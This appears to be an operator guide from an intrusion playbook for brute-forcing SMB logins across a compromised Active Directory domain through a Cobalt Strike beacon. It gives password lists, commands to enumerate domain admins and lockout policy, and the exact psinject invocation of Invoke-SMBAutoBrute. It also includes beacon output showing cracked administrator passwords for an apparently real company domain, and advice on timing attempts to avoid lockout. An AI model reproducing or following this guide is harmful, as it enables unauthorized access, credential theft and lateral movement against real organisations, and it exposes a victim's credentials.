```SMB AUTOBRUT
The inputs for this attack are solely passwords.
   - Those which were superseded by SharpChrome browser
   - those succeeded by SeatBelt
   - Those of the passwords obtained via network activity (mimikatz, etc.)
And in general any others, such as those found in the files.

If there are fewer such passwords than we can launch a bruteforce attack, feel free to add them from the following list of the most common passwords in a corporate environment.

Password1
Hello123
password
Welcome1
banco@1
training
Password123
job12345
spring
food1234


We also recommend using password lists based on seasons and the current year. Considering that passwords change every three months, you can take a "reserve" to generate such a list.
For example, in August 2020 we create the following list

June2020
July2020
August20
August2020
Summer20
Summer2020
June2020!
July2020!
August20!
August2020!
Summer20!
Summer2020!

All of the passwords above fall into either 3 of the 4 Active Directory password requirements (which is enough for users to set them), or all 4 requirements.
Note: we are considering the most popular variant of the requirements.



   Scenario with domain administrators
1.   Gather a list of domain admins by issuing shell net group "domain admins" /dom command
   Write all the obtained data into the
   admins.txt

2.   Upload this file to host folder C:\ProgramData

3.   Request information on domain account blocking policy (protection against bruteforce)
   
   beacon> shell net accounts /dom
   

    Tasked beacon to run: net accounts /dom
    host called home, sent: 48 bytes
    received output:


   The request will be processed at a domain controller for domain shookconstruction.com.
   Force user logoff how long after time expires?:       Never
   Minimum password age (days):                          1
   Maximum password age (days):                          42
   Minimum password length:                              6
   Length of password history maintained:                24
   Lockout threshold:                                    Never
   Lockout duration (minutes):                           30
   Lockout observation window (minutes):                 30
   Computer role:                                        BACKUP

   We are interested in the parameter Lockout threshold, which most often contains a certain numeric value, which in the future we should use as a parameter (in this case it is Never - which means that the protection against password brute force is disabled.
   In this guide we will use the value 5 as a rough guide to the most common.
   Minimum password length parameter specifies the minimum allowed number of characters of the password, it is required for filtering our password list.

4. In the script source code we specify the domain where the script will run
   - string $context = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain", "shookconstruction.com")

5.   Import and run the script
   powershell-import /tmp/Fast-Guide/Invoke-SMBAutoBrute.ps1
   psinject 4728 x86 Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
   - 4728 is the current pid in this case, and x86 is its bit size
   - The list of passwords consists of one which we have "found" and two from the list of popular passwords

6.   Watch the script and see the result
   

    Success! Username: Administrator. Password: 1qazXDR%+
    Success! Username: CiscoDirSvcs. Password: 1qazXDR%+


   
   We've scrambled two domain administrators.

========================================================================
   
   The script without specifying a list of users differs in only two things.
   - psinject 4728 x86 Invoke-SMBAutoBrute -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5
      We don't specify parameters UserList and ShowVerbose. The absence of the first means that the search will be conducted on ALL users in the domain, the absence of the second indicates that the output will be only successful results.

   I will not wait in the video guide to finish the script that will search all pairs of user / password in the domain, I will show only the output.
   
   

    Success! Username: Administrator. Password: 1qazXDR%+
    Success! Username: CiscoDirSvcs. Password: 1qazXDR%+
    Success! Username: support. Password: 1qazXDR%+
    Success! Username: accountingdept. Password: 1qazXDR%+   


   
   As you can see, we were able to find accounts of other users, which may be useful for further promotion on the network and raising the rights.

   If there is no positive result, you can try again after a while (optimal to multiply the Lockout duration parameter by two before the next attempt) with a new list of passwords.
   The end of the script will be indicated by a message in beacon
